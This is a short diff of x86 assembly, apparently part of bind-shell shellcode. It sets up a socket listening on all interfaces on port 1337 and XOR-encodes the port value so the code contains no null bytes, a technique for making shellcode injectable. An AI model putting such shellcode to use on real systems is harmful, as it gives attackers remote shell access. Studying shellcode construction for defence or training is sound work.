@@ -36,7 +36,15 @@ _start:
 	push edx	; padding 4 bytes
 	push edx	; padding 4 bytes
 	push edx	; address field, set to 0.0.0.0 to bind to all interfaces
-	push word 0x3905; port number in little endian format
+
+	; port 1337 is in little endian 0x3905
+        ; we XOR the address using a mask of 0xffff and we get 0xc6fa
+        ; in order to restore the initial value we need to XOR again with the mask
+        ; this is done to avoid null characters in case our port contain 0
+
+	mov eax, 0xffffffff
+	xor ax, 0xc6fa
+	push ax		; port number in little endian format
 	push word 0x02	; address family
 
 	mov ecx, esp	; save the struct address in stack
